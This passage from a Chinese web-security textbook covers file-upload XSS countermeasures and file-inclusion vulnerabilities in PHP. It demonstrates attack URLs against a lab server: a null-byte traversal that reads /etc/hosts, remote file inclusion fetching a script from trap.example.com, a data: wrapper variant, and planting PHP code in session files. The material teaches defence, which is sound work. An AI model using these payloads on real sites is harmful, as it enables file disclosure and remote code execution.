如果用户的 PC 中没有安装 Content-Type 所对应的应用程序，该 Content-Type
就会被浏览器视为"未知"，从而就可能会造成 XSS。
要处理此问题并不容易。但通过采取以下措施即可进行有效的防范。
-   托管文件的服务器使用其他域名
-   添加 Content-Disposition 消息头
然而，由于上述方法会产生副作用，因此建议采取以下方法，虽然可靠性略逊一筹但能保证没有副作用。
-   校验 URL 是否与应用中预想的一致
-   通知用户安装浏览文件所需的应用程序
#### **总结**
本节讲述了图像的上传与下载处理所引起的安全隐患。虽然上传处理造成的安全隐患一直以来都没有受到太大关注，但是，鉴于漏洞造成的影响较大，并且可照相手机的高速普及造成了照片分享网站的增加，此外存储服务网站也在快速增长，因此想必今后会有越来越多的
Web 应用需要警惕这个安全隐患。
文件上传与下载问题的基本对策为正确设置 Content-Type
和扩展名。图像文件的情况下，校验文件头是最起码的操作，此外，根据需要还应当校验图像文件的有效性。
> **参考文献**
>
> \[1\] はせがわようすけ .（2009 年 3 月 30 日）. \[ 无视できない \]IE
> の Content-Type 无视（\[ 无法忽视 \]IE 中对 Content-Type 的忽视）.
> 参考日期：2010 年 10 月 13 日 . 参考网址：@IT
> ：
>
> \[2\] 德丸浩（2007 年 12 月 10 日）. 画像ファイルによるクロスサイト ·
> スクリプティング (XSS)
> 倾向と対策（图像文件引起跨站脚本（XSS）的倾向与对策）. 参考日期：2010
> 年 10 月 13 日，参考网址：德丸浩の日记 :
> 
## **4.13 include 相关的问题** {#text00000.html#nav_point_53}
本节将讲述由能够使部分脚本从外界读入的 include 机制所引发的安全隐患。
### **4.13.1 文件包含攻击** {#text00000.html#nav_point_54}
#### **概要**
PHP 等脚本语言能够从外部文件读取脚本源代码的一部分。PHP 中对应的函数有
`require` 、`require_once` 、`include` 、`include_once` 。
如果外界能够指定 `include` 的对象文件名，就可能会发生意料之外的文件被
include 而遭到攻击。这被称为文件包含漏洞 [69]{.注释编号}
。某些情况下，PHP 中还可以通过配置来指定外部服务器的 URL
作为文件名，这就被称为远程文件包含（RFI）。
[69]{.注释编号下} 本书对安全隐患的命名参考了 CWE-98
中的记述（ 2010 年 12 月
19 日）。关于 CWE（Common Weakness
Enumeration，统一的软件漏洞一览定义工程）的说明，请参考
 （日文）。
文件包含攻击的影响如下。
-   Web 服务器的文件被外界浏览而导致信息泄漏
-   脚本被任意执行所造成的影响。典型的影响如下
    -   篡改网站
    -   执行非法操作
    -   攻击其他网站（垫脚石）
为了防范文件包含漏洞，建议实施以下任意一项对策。
-   避免 include 的路径名中包含外界传入的参数
-   include 的路径名中包含外界传入的参数时，限制其字符种类仅为字母和数字
**文件包含漏洞总览**
![{%}](Image00170.jpg)
#### **攻击手段与影响**
接下来我们就来看一下文件包含攻击的手段与其影响。首先来看以下存在漏洞的示例脚本。
> **代码清单 /4d/4d-001.php**
``` 代码无行号
正文【省略】
```
这段脚本使用了 `require_once`
来读取页面头部文件。实验环境的虚拟机中提供有头部文件示例，即以下
spring.php 文件。
> **代码清单 \[ 示例头部文件 \] spring.php**
``` 代码无行号
已经是春天了啊 
```
正常情况下，使用如下 URL 就能指定此示例文件。
``` 代码无行号
http://example.jp/4d/4d-001.php?header=spring
```
![{%}](Image00171.jpg)
**图 4-116 执行示例脚本后的页面显示**
-   **文件包含引发的信息泄漏**
    下面就让我们来看一下如何实施攻击。这里我们首先借鉴目录遍历攻击的手法来启动以下
    URL。URL 末尾的 %00 是为了使 PHP 脚本中添加的 .php
    扩展名无效，这一点在 4.2 节中已经做过介绍。
    ``` 代码无行号
    http://example.jp/4d/4d-001.php?header=../../../../etc/hosts%00
    ```
    ![{%}](Image00172.jpg)
    **图 4-117 文件包含攻击致使 Web 服务器的文件内容被显示**
    /etc/hosts 文件的内容被显示在了页面上。由此可见，文件包含攻击能造成
    Web 服务器内的非公开文件泄漏。
    目前为止，我们所看到的漏洞造成的影响可以说与目录遍历漏洞完全相同，但由于
    include
    机制还能够读取脚本并将其执行，因此就能够让外界执行其指定的脚本，从而形成极大的风险。下面我们就来看一下这种攻击手段。
-   **执行脚本 1：远程文件包含攻击（RFI）**
    PHP 的 `include/require` 有如下功能：如果指定 URL 作为文件名，就能够
    include 外部服务器的文件（Remote File Inclusion;
    RFI）。但由于此功能极其危险，因此在 PHP5.2.0
    之后的版本中都默认将其设为无效。
    但为了讲解这一漏洞，本书的试验环境虚拟机中将远程文件包含功能设为了有效。因此，这里我们就能够重现下面介绍的攻击模式。
    首先，准备以下文件作为外部的攻击脚本。
    > **代码清单 http://trap.example.com/4d/4d-900.txt**
    ``` 代码无行号
    ```
    然后，通过如下形式的 URL 来调用 4d-001.php。由于在 4d-001.php
    内部会给 URL 添加 .php 扩展名，因此在 URL 的最后添加 ? 以使得 .php
    被解释为查询字符串。
        http://example.jp/4d/4d-001.php?header=http://trap.example.com/4d/4d-900.txt?
    在 4d-001.php 的 `require_once` 处给文件名添加 .php
    扩展名后，最终拼接成的 URL 就如下所示。
    ``` 代码无行号
    http://trap.example.com/4d/4d-900.txt?.php
    ```
    可以看出，扩展名 .php 变成了查询字符串，被下载的文件变成了
    4d-900.txt。
    最终，页面上显示了 `phpinfo` 的执行结果。
    ![{%}](Image00173.jpg)
    **图 4-118 执行了外部服务器的脚本**
    图 4-118 显示了一些能够用来判断 `phpinfo`
    是在哪个服务器上被执行的项。例如，从 Host 项中就能得知 `phpinfo`
    是在 example.jp 上被执行的。
    > **专栏：RFI 攻击的变种**
    >
    > 正如上面所介绍的那样，如果 RFI
    > 被设置为有效，那么攻击者通过将用来攻击的字符串存放在外部服务器中并设法使其被包含，就能达到执行任意脚本的目的。其实，除此之外还有更为简单的攻击方式。
    >
    > 具体来说，针对 RFI 漏洞，使用 data: 数据流封装器或者 PHP
    > 输入流也能够实施攻击。下面的 URL 即展示了如何使用 data:
    > 数据流封装器来实施攻击[70]{.注释编号} 。
    >
    >     http://example.jp/4d/4d-001.php?header=data:text/plain;charset=,
    >
    > 防范此类攻击的策略同 RFI 一样，将 allow_url_include 设为 Off
    > 即可（后述）。另外，关于 data: 数据流封装器或者 PHP
    > 输入流的详情，可以参考 PHP 的官方文档。
    >
    > -   PHP 输入流的文档
    >
    >     
    >
    > -   data: 数据流封装器的文档
    >
    >     
-   **执行脚本 2：恶意使用保存会话信息的文件**
    即使 RFI 功能被禁止，只要能够在 Web
    服务器上写入任意内容，攻击者就还是有可能通过文件包含攻击而使外界执行脚本。比如下列两种情况。
    -   允许上传文件的网站
    -   将会话变量保存在文件中的网站
    上述两种情况下，如果文件名能够被推测，就会造成问题。下面我们将主要介绍将会话变量保存在文件中的情况，这也是
    PHP 的默认设置。
    这里假设攻击对象网站的某个页面将外界输入的值直接保存至了会话变量。下面我们以咨询网站的脚本为例进行说明。首先看到的是输入表单。为了使读者们能更直观地体验漏洞，这里的攻击代码（阴影部分）被设置为了初始值，而这一操作本来是没有的。
    > **代码清单 /4d/4d-002.html**
        请提问 
        &lt;?php phpinfo(); ?&gt;
    接着就是接收到用户提问后进行处理的脚本。脚本中只是将 POST
    的数据保存到会话变量中，此处为了演示的方便，我们将会话变量的保存地址等显示在页面上。
    > **代码清单 /4d/4d-003.php**
    ``` 代码无行号
        提问已受理 
        保存会话信息的文件名 
        %00">
        文件包含攻击 
        >
    ```
    执行上述脚本后的页面如图 4-119 所示。
    ![{%}](Image00174.jpg)
    **图 4-119 执行示例脚本的页面显示**
    为了方便读者参考，上图中在页面上显示了保存会话信息的文件名，但实际的应用程序中并不会显示出来，因此文件名是否能被推测就成为了关键问题。
    保存会话信息的文件名由会话信息的存储路径和会话 ID
    组成。存储路径可以在配置中更改，但由于各个 OS（Linux
    发行版）都决定了各自的默认存储路径，想必多数应用程序都直接使用了默认路径。而会话
    ID 能够从 Cookie
    值中获取。因此，攻击者能够推测保存会话信息文件的文件名。